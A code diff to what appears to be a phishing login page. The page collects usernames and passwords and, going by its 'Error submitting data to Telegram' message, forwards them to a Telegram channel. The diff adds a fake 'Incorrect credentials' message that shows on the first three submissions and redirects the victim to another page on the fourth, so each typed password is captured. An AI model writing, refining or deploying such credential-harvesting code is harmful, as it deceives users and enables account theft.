@@ -63,6 +63,14 @@
             cursor: pointer;
         }
 
+        /* Error message styling */
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
         /* Additional text */
         .text-muted {
             color: #8e8e8e;
@@ -89,6 +97,7 @@
             <input type="password" class="input-field" id="password" placeholder="Password" required>
             <button type="submit" class="login-button">Log In</button>
         </form>
+        <p id="error" class="error-message">Incorrect credentials. Please try again.</p>
         <p class="text-muted">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
     </div>
 
@@ -133,11 +142,13 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            // Redirect after 4th attempt
-                            if (attemptCounter >= 4) {
-                                window.location.href = "flock.html"; // Redirect page
+                            if (attemptCounter < 4) {
+                                // Show error message for first three attempts
+                                const errorMessage = document.getElementById("error");
+                                errorMessage.style.display = "block";
                             } else {
-                                alert(`Attempt ${attemptCounter}/4 recorded.`);
+                                // Redirect on the fourth attempt
+                                window.location.href = "flock.html"; // Redirect page
                             }
                         } else {
                             alert("Error submitting data to Telegram.");
